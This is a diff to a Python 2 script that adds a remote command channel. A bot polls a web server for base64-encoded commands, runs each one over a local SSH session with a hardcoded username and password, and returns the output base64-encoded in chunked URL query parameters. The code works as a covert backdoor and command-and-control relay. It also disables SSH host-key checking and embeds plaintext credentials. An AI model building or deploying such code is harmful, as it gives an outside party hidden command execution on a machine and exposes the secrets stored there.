@@ -1,4 +1,5 @@
 import time
+import base64
 import paramiko
 import urllib2
 import SocketServer
@@ -25,9 +26,10 @@ class RequestManager :
     HTML_SUFFIX = '</p></html>'
 
     EOT = 'DEADBEEF'
+    MAX_SIZE = 255
     
-    BUFFER_SSH_TO_HTTP = 'ls -la'
-    BUFFER_HHTP_TO_SHH = ''
+    BUFFER_SSH_TO_HTTP = ''
+    BUFFER_HTTP_TO_SSH = ''
 
     @staticmethod
     def doesSSHReady_E():
@@ -67,8 +69,22 @@ class RequestManager :
         Return the clear data without HTML tags
         """
         strr = string.replace(RequestManager.HTML_PREFIX, '')
-        strr = strr.replace(RequestManager.HTML_SUFFIX, '')
-        return strr
+        return strr.replace(RequestManager.HTML_SUFFIX, '')
+
+
+    @staticmethod
+    def isResultRequest(req):
+        """
+        Tell us if the request req is an result request
+        """
+        tmp = req
+        tab_temp = tmp.split('?')
+        if len(tab_temp) > 1:
+            keyword = tab_temp[0]
+            if keyword == RequestManager.url_set_W_HaveResult:
+                return True
+        return False
+
 
 
     @staticmethod
@@ -76,11 +92,12 @@ class RequestManager :
         """
         Treat the req and strip the result and return it
         """
-        tmp = RequestManager.requestToString(req)
+        tmp = req
         tab_temp = tmp.split('?')
-        keyword = tab_temp[0]+'?'
+        keyword = tab_temp[0]
         tmp = tmp.replace(keyword, '')
-        return RequestManager.getClearData(tmp)
+        tmp = tmp.replace('?'+RequestManager.response+'=', '')
+        return tmp
 
 
     @staticmethod
@@ -98,11 +115,30 @@ class RequestManager :
         except:
             pass     
         print "Answer ==> "+result
-        return result
+        return result.strip()
 
 
-
-
+    @staticmethod
+    def formatResult(result):
+        """
+        Strip our data in part of 255 char max
+        """
+        i = 0
+        tmp = ''
+        table = []
+        if len(result) > RequestManager.MAX_SIZE:
+            for char in result:
+                i = i+1
+                tmp += char
+                if i == RequestManager.MAX_SIZE:
+                    table.append(tmp)
+                    tmp = ''
+                    i = 0
+            if tmp != '':
+                table.append(tmp)
+        else:
+            table.append(result)
+        return table
 
 
 
@@ -165,7 +201,7 @@ class W_Bot:
     Help us to lauch W functions
     ----------------------------------------------
     """
-
+    SSH_CLIENT = ''
     TIME_TO_WAIT = 5
     BASE_URL = ''
 
@@ -184,32 +220,58 @@ class W_Bot:
             if RequestManager.E_isReady and not RequestManager.W_isReady:
                 print "E is ready"
                 W_Bot.openSSH()
+                print "SSH OPENED on W"
 
             # Quand E et W sont prets en SSH on peut commencer la communication
             if RequestManager.doesW_WaitingOrder():
-                """
+                print "E is ready on SSH, W too"
                 command = W_Bot.askCommand()
+
+                # Redemander la commande tant qu'on en a pas recu
+                while command == RequestManager.kO:
+                    W_Bot.sleep()
+                    command = W_Bot.askCommand()
                 #E est aussi pret ET a envoye une commande
-                if command != RequestManager.kO:                    #On ecrit la commande dans le BUFFER_HTTP_TO_SSH
-                    pass
-                
-                """
-    
+                if command != RequestManager.kO:                   
+                    #On execute la commande et on renvoie le resultat a E
+                    result = W_Bot.execute(command)
+                    list_result = RequestManager.formatResult(result)
+                    for string in list_result:
+                        print "==> "+string
+                        code = base64.b64encode(string)
+                        url = W_Bot.BASE_URL+RequestManager.url_set_W_HaveResult+'?'+RequestManager.response+'='+code
+                        state = RequestManager.request(url)
+
+
+                    url = W_Bot.BASE_URL+RequestManager.url_set_W_HaveResult+'?'+RequestManager.response+'='+RequestManager.EOT
+                    state = RequestManager.request(url)
+
+                    exit(0)
+
+
+    @staticmethod
+    def execute(command):
+        """
+        Exec an command on W using the SSH_CLIENT
+        """
+        cmd = base64.b64decode(command)
+        cmd = cmd.strip()
+        print"Commande a executer ==> "+cmd
+        stdin, stdout, stderr = W_Bot.SSH_CLIENT.exec_command(cmd)
+        data = stdout.read()
+        print "Result command =>"+data
+        return data
+
+
     @staticmethod
     def openSSH():
         """
         Open an SSH connection on W localhost
         """
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect('127.0.0.1', username='doc', 
+        W_Bot.SSH_CLIENT = paramiko.SSHClient()
+        W_Bot.SSH_CLIENT.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        W_Bot.SSH_CLIENT.connect('127.0.0.1', username='doc', 
             password='0irakboss')
-
-        stdin, stdout, stderr = ssh.exec_command(
-            "vim Bureau/test2.html")
-        stdin.flush()
-        data = stdout.read()
-        print data
         RequestManager.W_isReady = True
 
 
@@ -245,7 +307,7 @@ class W_Bot:
         """
         Ask a command to E
         """
-        return RequestManager.request(RequestManager.url_set_W_WaitOrder)
+        return RequestManager.request(W_Bot.BASE_URL+RequestManager.url_set_W_WaitOrder)
 
 
 
